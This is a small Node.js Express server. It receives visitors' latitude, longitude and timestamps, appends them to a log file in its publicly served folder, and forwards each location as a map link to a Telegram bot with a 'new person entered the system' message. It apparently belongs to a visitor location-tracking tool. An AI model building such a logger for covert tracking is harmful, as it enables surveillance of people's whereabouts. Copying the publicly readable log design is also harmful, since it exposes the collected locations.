require("dotenv").config();
const express = require("express");
const fs = require("fs");
const path = require("path");
const axios = require("axios");

const app = express();
app.use(express.static(path.join(__dirname, "public")));
app.use(express.json());

const LOG_FILE = path.join(__dirname, "public", "location-log.json");
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.post("/api/save-location", async (req, res) => {
  const { latitude, longitude, timestamp } = req.body;

  const newEntry = { latitude, longitude, timestamp };

  let log = [];
  if (fs.existsSync(LOG_FILE)) {
    const raw = fs.readFileSync(LOG_FILE);
    log = JSON.parse(raw);
  }

  log.push(newEntry);
  fs.writeFileSync(LOG_FILE, JSON.stringify(log, null, 2));

  const text = `📍 คนใหม่เข้าระบบ\nพิกัด: https://maps.google.com/?q=${latitude},${longitude}\nเวลา: ${new Date(timestamp).toLocaleString()}`;
  await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    chat_id: CHAT_ID,
    text
  });

  res.send({ status: "ok" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server running on port", PORT));
